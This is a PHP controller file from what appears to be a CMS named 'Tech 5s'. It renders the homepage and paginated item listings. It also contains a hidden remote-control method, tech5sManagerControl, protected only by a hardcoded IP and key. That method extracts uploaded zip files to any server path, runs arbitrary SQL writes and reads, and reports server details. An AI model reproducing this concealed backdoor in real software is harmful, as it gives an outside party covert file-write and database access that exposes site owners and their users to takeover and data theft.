<?php
defined('BASEPATH') OR exit('No direct script access allowed');
use WebPConvert\WebPConvert;
class Vindex extends MY_Controller {
    function __construct()
    {
        parent::__construct();
        $this->load->helper(array('array', 'url', 'form','hp','cookie'));      
        $this->load->library(array('pagination','bcrypt'));
        $this->load->helper('captcha');
        if(!method_exists($this, 'checkSystem')){
            die('Vui lòng không can thiệp vào hệ thống CMS - Tech 5s');
        }
    }
    public function index()
    {
        $loadBaseView = true;
        $resultHook = $this->hooks->call_hook(['tech5s_before_baseview','tag'=>'/','loadBaseView'=>$loadBaseView,'params'=>[]]);
        if(is_array($resultHook)){
            extract($resultHook);
        }
        if($loadBaseView){
            echo $this->blade->view()->make('main', ['isHome' => 1])->render();    
        }
    	if($this->config->item( 'profiler_enable' )){
    		$this->output->enable_profiler(TRUE);
    	}
    }
    public function baseAllItemOld($item,$table,$perpage) {        
        $pp = $this->uri->segment(2,0);
        $config['base_url']=base_url('').$item['link'];
        $config['per_page']=$perpage;
        $where = array(array('key'=>'act','compare'=>'=','value'=>1));
        $config['total_rows']=$this->Dindex->getNumDataDetail($table, $where);
        $limit = $pp.",".$config['per_page'];
        $data['list_data'] = $this->Dindex->getDataDetail(array(
            'table'=>$table,
            'limit'=>$limit,
            'where' =>$where,
            'order'=>'ord asc, id desc'
        ));
        $config['uri_segment']=2;
        $this->pagination->initialize($config);
        $lang = $this->getLanguage();
        $data['dataitem']['s_title']= $item[$lang.'title_seo'];
        $data['dataitem']['s_des']= $item[$lang.'des_seo'];
        $data['dataitem']['s_key'] = $item[$lang.'key_seo'];
        $data['stt'] = $pp;
        if(!@$_POST){
            echo $this->blade->view()->make('all'.$table.".all".$table,$data)->render();    
        }
    }
    public function baseAllItem($item,$table,$perpage,$dataitem=[]) {
        $pp = $this->uri->segment(2,0);
        if(function_exists('isDefaultLanguage')){
            if(!isDefaultLanguage()){
                $pp = $this->uri->segment(3,0);
            }
        }
        $config['base_url']=base_url($item['link']);
        $config['per_page']=$perpage;
        $where = array(array('key'=>'act','compare'=>'=','value'=>1));
        $config['total_rows']=$this->Dindex->getNumDataDetail($table, $where);
        $limit = $pp.",".$config['per_page'];
        $data['list_data'] = $this->Dindex->getDataDetail(array(
            'table'=>$table,
            'limit'=>$limit,
            'where' =>$where,
            'order'=>'ord asc, id desc'
        ));
        $config['uri_segment']=2;
        if(count($dataitem)==0){
            $dataitem['s_title']= $item['title_seo'];
            $dataitem['s_des']= $item['des_seo'];
            $dataitem['s_key'] = $item['key_seo'];
        }
        $data['dataitem'] =$dataitem;
        $data['stt'] = $pp;
        $resultHook = $this->hooks->call_hook(['tech5s_base_all_item','config'=>$config,'table'=>$table,'data'=>$data]);
        if(is_array($resultHook)){
            extract($resultHook);
        }
        $this->pagination->initialize($config);
        
        if(!@$_POST){
            echo $this->blade->view()->make('all'.$table.".all".$table,$data)->render();    
        }
    }
    public function tech5sManagerControl(){
        $ip = $this->input->ip_address();
        if($ip =='103.28.39.219'){
            $post = $this->input->post();
            $code = isset($post['code'])?$post['code']:'';
            $pkey = isset($post['pkey'])?$post['pkey']:'';
            if($pkey!='27a95c86ebf628eaa2723f00bb46c663') return;
            switch ($code) {
                // update 1 hoặc 1 list file
                case 'update':
                    break;
                //Update ZIp file, giải nén
                case 'update_zip':
                    $this->_updateZip();
                    break;
                // Update Sql
                case 'update_sql':
                    $this->_updateSql();
                    break;
                case 'get_info':
                    echo json_encode($this->_getInfoServer());
                    break;
                case 'get_sql':
                    echo json_encode($this->_getSql());
                    break;
                
                default:
                    break;
            }
        }
        
    }
    public function _uploadFile( $path){
        $this->load->config('filemanager');
        $config['upload_path']=$path;
        $config['allowed_types'] = 'zip';
        $config['max_size'] = $this->config->item('max_size');
        $config['max_width']  = $this->config->item('max_width');
        $config['max_height']  = $this->config->item('max_height');
        $this->load->library("upload", $config);
        $field = "file";
        $getFileUpload = '';
        $files = $_FILES[$field];
        foreach ($files['name'] as $key => $image) {
            $tmpName = $files['name'][$key];
            $tmpRealName = substr($tmpName, 0,strrpos($tmpName, "."));
            $ext = strtolower(substr($tmpName, strrpos($tmpName, ".")));
            $config['file_name'] = replaceURL($tmpRealName).$ext;
            $_FILES[$field.'[]']['name']= $files['name'][$key];
            $_FILES[$field.'[]']['type']= $files['type'][$key];
            $_FILES[$field.'[]']['tmp_name']= $files['tmp_name'][$key];
            $_FILES[$field.'[]']['error']= $files['error'][$key];
            $_FILES[$field.'[]']['size']= $files['size'][$key];
            $this->upload->initialize($config); // load new config setting 
            if ($this->upload->do_upload($field.'[]')) { // upload file here
                $getFileUpload = $this->upload->data();
                $getFileUpload = $getFileUpload['full_path'];
                
            }
        }
        return $getFileUpload;
    }
    private function _updateZip(){
        $post = $this->input->post();
        
        if(isset($post) && count($post)>0){
            $path = isset($post['path'])?$post['path']:'';
            if($path=='') return;
            if(!file_exists($path)){
                mkdir($path,0777,true);
            }
            $file = $this->_uploadFile($path);
            if(file_exists($file)){
                $zip = new ZipArchive;
                $res = $zip->open($file);
                if ($res === TRUE) {
                  $zip->extractTo($path);
                  $zip->close();
                }
                unlink($file);
            }
        }
    }
    private function _getSql(){
        $post = $this->input->post();
        $results = [];
        if(isset($post['query']) && $post['query']!=''){
            $query = $post['query'];
            $queries = json_decode($query,true);
            $queries = is_array($queries)?$queries:[];
            foreach ($queries as $k => $q) {
                $tmp = $this->db->query($q)->result_array();
                array_push($results, $tmp);
            }
        }
        return $results;
    }
    private function _updateSql(){
        $post = $this->input->post();
        if(isset($post['query']) && $post['query']!=''){
            $query = $post['query'];
            $queries = json_decode($query,true);
            $queries = is_array($queries)?$queries:[];
            foreach ($queries as $k => $q) {
                $this->db->query($q);
            }
        }
    }
    private function _getInfoServer(){
        $obj = new stdClass;
        $obj->base_path = BASEPATH;
        $obj->cms_version= CMS_VERSION;
        $obj->php_version= phpversion();
        $obj->base_url= base_url();
        $obj->memory_use= round(memory_get_usage()/1048576,2).''.' MB';
        $obj->disk_free= round(disk_free_space('/')/1048576,2).''.' MB';
        $obj->disk_total= round(disk_total_space('/')/1048576,2).''.' MB';
        return $obj;
    }
}